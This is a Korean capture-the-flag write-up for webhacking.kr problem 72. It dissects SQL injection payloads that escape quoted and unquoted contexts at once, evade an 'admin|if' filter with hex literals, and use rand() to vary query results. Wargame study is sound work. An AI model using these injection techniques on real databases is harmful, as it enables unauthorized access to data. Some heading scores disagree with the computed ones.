# webhacking.kr / alien-golf (problem 72)

## 문제 개요

```php
if(preg_match('/admin|if/i', $_GET['no'])) exit("No Hack ~_~");
$query  = "select id from prob_alien where no={$_GET[no]}";
$query2 = "select id from prob_alien where no='{$_GET[no]}'";
if($_GET['no']){
  $r = mysqli_fetch_array(mysqli_query($db,$query));
  if($r['id'] !== "admin") exit("sandbox1");
  $r = mysqli_fetch_array(mysqli_query($db,$query));
  if($r['id'] === "admin") exit("sandbox2");
  $r = mysqli_fetch_array(mysqli_query($db,$query2));
  if($r['id'] === "admin") exit("sandbox");
  $r = mysqli_fetch_array(mysqli_query($db,$query2));
  if($r['id'] === "admin"){
    $len = 140 - strlen($_GET['no']);
    if($len > 0) solve(72, $len * 5);
  }
}
```

같은 페이로드 하나로 두 컨텍스트(`no={no}`, `no='{no}'`)를 동시에 깨야 하고, 같은 쿼리를 두 번 연속 호출했을 때 첫 행이 admin → not admin 으로 바뀌어야 한다 (query2도 not admin → admin). 점수는 `(140 - strlen) * 5`.

| 호출 | 쿼리 | 통과 조건 |
|------|------|-----------|
| 1 | `select id from prob_alien where no={no}` | `mysqli_fetch_array.id === "admin"` |
| 2 | (동일) | `id !== "admin"` |
| 3 | `select id from prob_alien where no='{no}'` | `id !== "admin"` |
| 4 | (동일) | `id === "admin"` |

각 호출은 **개별 `mysqli_query`** 이므로 `rand()`가 새로 평가되어 비결정성이 발생할 수 있다. 비결정 허용이라 1/N 확률이라도 한 번만 맞으면 풀린다.

## 원본 480점 풀이의 정밀 해부

```
1%23%27%0aunion%09select%09substr(0x61646d696e,rand()%2,5)%23
```

URL-decoded: `1#'<LF>union<TAB>select<TAB>substr(0x61646d696e,rand()%2,5)#` (49 byte)

### 토큰별 역할

| 토큰 | query (no quotes) 에서 | query2 (with quotes) 에서 |
|------|------------------------|---------------------------|
| `1` | `where no=1`의 RHS | 문자열 시작부 (`'1#'` → 정수 1) |
| `#` | 줄 끝까지 주석 시작 | 문자열 안 (의미 없음) |
| `'` | 주석 본문에 포함되어 사라짐 | 문자열 종료 |
| `<LF>` | **`#` 주석 종료시키는 핵심** | 단순 공백 |
| `union<TAB>select<TAB>substr(...)` | UNION으로 합성 행 추가 | (문자열 종료 후) UNION으로 합성 행 추가 |
| 마지막 `#` | (할 일 없음) | 닫는 `'`를 주석 처리 |

두 쿼리가 환원되는 SQL은 동일하다:
```sql
select id from prob_alien where no=1 union select substr(0x61646d696e, rand()%2, 5)
```

### 왜 UNION SELECT를 쓰는가 — 풀이의 본질

`mysqli_fetch_array`는 결과셋의 **첫 행만** 반환한다. 이 풀이의 모든 설계는 "첫 행이 무엇인지를 어떻게 통제하는가"에 집중되어 있다.

1. **첫 SELECT를 의도적으로 0행으로 만든다.** `where no=1`은 어떤 행과도 매칭되지 않는다 (admin의 `no`는 1이 아니라는 사실이 원본이 동작한다는 점에서 보장됨).
2. **두 번째 SELECT는 FROM 없이 합성 행 1개를 만든다.** `substr(0x61646d696e, rand()%2, 5)` — `rand()`가 SELECT 리스트에 있어 매 쿼리 실행마다 1번 평가되고, 50% 확률로 `'admin'` (pos=1) 또는 `''` (pos=0) 반환.
3. **결과셋에는 합성 행 하나만 들어있다.** `mysqli_fetch_array` 첫 행 = admin 또는 ''. 깔끔하게 50/50.
4. 4번의 호출이 독립이므로 (admin, '', '', admin) 패턴은 (1/2)⁴ = **1/16**.

### `rand()%2` 와 `substr` 의 미묘한 동작

- PHP `urldecode`는 `%2,` 처럼 뒤가 hex가 아니면 디코딩하지 않으므로 MySQL이 받는 문자열은 그대로 `rand()%2` (MySQL의 MOD 연산).
- MySQL에서 `rand() % 2`는 `rand()` 와 사실상 동일 (rand가 [0,1) 이므로 mod 2 결과도 [0,1)).
- `SUBSTR('admin', pos, 5)` 의 `pos`가 float일 때 MySQL은 정수로 변환 (round half away from zero).
  - `rand() < 0.5` → pos=0 → `''`
  - `rand() ≥ 0.5` → pos=1 → `'admin'`
- 이름이 `admin`인 keyword를 직접 쓸 수 없으므로 (`/admin|if/i` 필터) **16진수 `0x61646d696e`로 우회**.

## 제가 처음 시도한 단축안의 실패 분석

처음 17 byte로 단축한 `0#'\nor rand()<.5#` 와 `1#'\nor rand()<.5#` 는 **원본의 본질을 놓친 풀이**였다.

이 페이로드들은 환원되면 `where no=X or rand()<.5` 가 된다. WHERE 절의 rand는 매 행마다 평가되는 게 맞지만, **`mysqli_fetch_array`가 가져올 첫 행은 통과한 행들 중 PK가 가장 작은 행**이다.

| 시나리오 | 첫 행이 admin일 확률 |
|---------|----------------------|
| `prob_alien`이 admin 단일 행 | rand 통과 시 admin (50%) |
| admin이 PK 첫 번째 + 다른 행도 있음 | admin이 통과하면 admin (50%) |
| admin이 PK 첫 번째가 **아님** | admin 앞의 어떤 행도 통과하지 못해야 admin이 첫 행 → 확률 급감 |

게다가 사용자 환경에서 `0` 리터럴 시도가 sandbox1 100% 통과 / sandbox2 100% 탈락으로 나온 것은 admin 행이 **항상** 결과에 들어오고 있다는 뜻이고, 그 원인이 `no=0`이 admin과 매칭되었기 때문이라는 보장도 없다 (다른 행이 PK 앞에 있어 가려졌을 수도 있다는 등 변수가 너무 많음).

`1`로 바꿔도 위 표의 세 번째 행처럼 admin이 PK 앞순위가 아니면 영영 풀이가 안 될 수 있다 — **테이블 레이아웃 가정에 의존하는 풀이**라서 실제 엔진에서 동작 보장이 안 됨.

**원본의 진짜 통찰**: 결과셋에 admin 외의 행이 끼어들 여지를 차단해야 한다. 원본은 UNION SELECT로 합성 행만 두는 식으로, 단축안은 WHERE에서 admin만 통과시키는 필터를 거는 식으로 해결할 수 있다.

## 510점 단축 풀이 (34 byte → 530점)

```
1#'<LF>or id=0x61646d696e&&rand()<.5#
```

URL: `?no=1%23%27%0aor%20id=0x61646d696e%26%26rand()%3c.5%23`

### 환원 결과

- query  : `where no=1#'<LF>or id=0x61646d696e&&rand()<.5#`
  - `#'<LF>` 가 주석으로 사라지고 → `where no=1 or id=0x61646d696e && rand()<.5`
- query2 : `where no='1#'<LF>or id=0x61646d696e&&rand()<.5#'`
  - `'1#'` (문자열, 정수 캐스팅 시 1) + `<LF>` (공백) + `or id=... && rand()<.5` + `#'` (닫는 `'` 주석 처리)
  - = `where no=1 or id='admin' && rand()<.5`

연산자 우선순위 `=`/`<` > `&&` > `OR` 에 따라 두 쿼리 모두:
```sql
where (no=1) or ((id='admin') AND (rand()<.5))
```

### 핵심 동작

매 행마다 평가:

| 행 | `no=1` | `id='admin'` | 합성 결과 | 통과 확률 |
|----|--------|--------------|-----------|-----------|
| admin | false (no≠1 보장) | true | `false OR (true AND rand<.5)` = `rand<.5` | **50%** |
| 그 외 | false | false | `false OR (false AND ...)` = `false` | **0%** |

⇒ 결과셋에는 admin이 들어오거나 (50%) 비어있거나 (50%). **테이블 행 수와 PK 순서에 무관**하게 `mysqli_fetch_array`는 항상 admin 또는 NULL만 돌려준다.

원본의 "결과셋에 admin 외엔 못 들어오게 한다" 원리를 그대로 유지하되, UNION SELECT 합성 행 대신 WHERE 필터로 같은 효과를 얻은 것.

### 확률 계산
- 호출당 P(id === "admin") = 0.5, P(id !== "admin") = 0.5
- 4-콜 통과 패턴 (admin, NULL, NULL, admin) = (1/2)⁴ = **1/16**
- 평균 16회, 95-percentile로 약 50회 시도

### 필터 우회 검증

`/admin|if/i` 가 차단하는 부분문자열:
- `admin` (a-d-m-i-n): `0x61646d696e` 안에 `a` 자체가 없음. `rand`의 `a` 다음은 `n`. ✓
- `if` (i-f): `id`의 `i` 다음은 `d`. ✓

### 점수 계산
```
strlen = 34
$len = 140 - 34 = 106
score = 106 * 5 = 530 점
```

## 비교 표

| 페이로드 | byte | 점수 | 첫 행 신뢰성 |
|---------|------|------|--------------|
| `1#'<LF>union<TAB>select<TAB>substr(0x61646d696e,rand()%2,5)#` (원본) | 49 | 455 | ✓ 합성 행만 결과셋 |
| `1#'<LF>or rand()<.5#` (잘못된 단축) | 17 | 615 | ✗ PK 순서·다른 행에 의존 |
| `1#'<LF>or id=0x61646d696e&&rand()<.5#` (현재) | **34** | **530** | ✓ admin 외 행 통과 불가능 |

## 핵심 통찰 정리

1. **`mysqli_fetch_array`는 첫 행만 본다.** 모든 설계는 "첫 행이 무엇인가"에 종속된다.
2. **결과셋에 admin 외 행이 끼면 끝장이다.** 그 행이 PK 앞순위라면 admin은 영영 첫 행이 못 된다.
3. **rand()는 SELECT-list 또는 admin-only 필터 안에서 써야** 위 두 조건이 깨지지 않는다. 단순히 `or rand()<.5` 같이 모든 행을 무차별로 통과시키는 식은 위험하다.
4. 두 컨텍스트 동시 탈출 표준 패턴 `숫자 + # + ' + <LF> + 페이로드 + #` 은 그대로 유지.
5. `admin`/`if` 필터 우회는 hex 리터럴(`0x61646d696e`)과 식별자 위치 조정 (`id`, `rand` 안의 `a`/`d` 분리)으로 해결.
